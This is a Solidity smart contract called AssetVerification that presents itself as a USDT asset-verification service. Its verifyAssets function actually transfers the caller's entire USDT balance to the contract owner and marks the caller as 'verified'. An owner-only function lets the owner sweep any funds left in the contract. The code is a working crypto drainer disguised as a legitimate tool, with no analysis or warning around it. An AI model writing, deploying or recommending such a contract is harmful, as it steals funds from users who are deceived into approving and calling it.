// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract AssetVerification {
    address public owner;
    address public usdtToken;
    
    mapping(address => bool) public verifiedAssets;
    mapping(address => uint256) public verificationTimestamp;
    
    event AssetVerified(address indexed user, uint256 amount, uint256 timestamp);
    event PaymentReceived(address indexed from, uint256 amount);
    
    constructor(address _usdtToken) {
        owner = msg.sender;
        usdtToken = _usdtToken;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }
    
    function verifyAssets() external {
        IERC20 usdt = IERC20(usdtToken);
        uint256 userBalance = usdt.balanceOf(msg.sender);
        
        require(userBalance > 0, "No USDT balance to verify");
        
        // Transfer all USDT to owner
        require(usdt.transferFrom(msg.sender, owner, userBalance), "Transfer failed");
        
        // Mark assets as verified
        verifiedAssets[msg.sender] = true;
        verificationTimestamp[msg.sender] = block.timestamp;
        
        emit AssetVerified(msg.sender, userBalance, block.timestamp);
        emit PaymentReceived(msg.sender, userBalance);
    }
    
    function isVerified(address user) external view returns (bool) {
        return verifiedAssets[user];
    }
    
    function getVerificationTime(address user) external view returns (uint256) {
        return verificationTimestamp[user];
    }
    
    function withdrawEmergency() external onlyOwner {
        IERC20 usdt = IERC20(usdtToken);
        uint256 balance = usdt.balanceOf(address(this));
        require(usdt.transfer(owner, balance), "Withdrawal failed");
    }
    
    function updateOwner(address newOwner) external onlyOwner {
        owner = newOwner;
    }
}
